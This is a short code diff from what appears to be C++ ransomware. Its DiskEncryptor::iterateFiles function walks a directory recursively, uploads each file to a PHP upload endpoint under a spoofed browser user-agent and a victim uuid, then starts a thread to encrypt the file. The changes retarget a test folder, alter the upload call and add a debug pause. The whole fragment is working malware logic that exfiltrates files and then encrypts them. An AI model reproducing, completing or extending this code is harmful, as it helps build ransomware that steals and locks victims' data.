@@ -38,7 +38,7 @@ bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByte
 
 void DiskEncryptor::iterateFiles(std::string uuid) {
 	std::vector<std::thread> threads;
-	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\Flavian\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
+	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\mXn\\Desktop\\fwareTest\\CEDAR\\signature", std::filesystem::directory_options::skip_permission_denied)) {
 		try {
 			if (entry.is_directory()) {
 				
@@ -60,8 +60,9 @@ void DiskEncryptor::iterateFiles(std::string uuid) {
 							std::string strl;
 							std::string str = "uuid=" + uuid + "&ext=" + ext;
 							Http fileUploader(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
-							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: multipart/form-data", entry.path().wstring(),strl, str);
+							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: multipart/form-data", entry.path().wstring(),strl);
 							std::cout << strl<< std::endl;
+							getchar();
 						}
 						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
 					}
